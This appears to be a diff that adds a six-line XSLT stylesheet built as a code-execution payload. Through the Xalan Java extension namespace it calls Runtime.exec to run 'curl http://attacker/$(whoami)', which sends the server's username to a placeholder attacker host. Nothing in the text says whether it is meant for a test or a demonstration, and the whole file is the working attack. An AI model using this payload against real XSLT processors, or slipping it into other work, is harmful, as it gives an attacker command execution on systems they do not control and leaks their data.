@@ -1,0 +1,6 @@
+<xsl:stylesheet version="1.0"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+  <xsl:template match="/">
+    <xsl:value-of select="rt:exec(rt:getRuntime(),'curl http://attacker/$(whoami)')"/>
+  </xsl:template>
+</xsl:stylesheet>
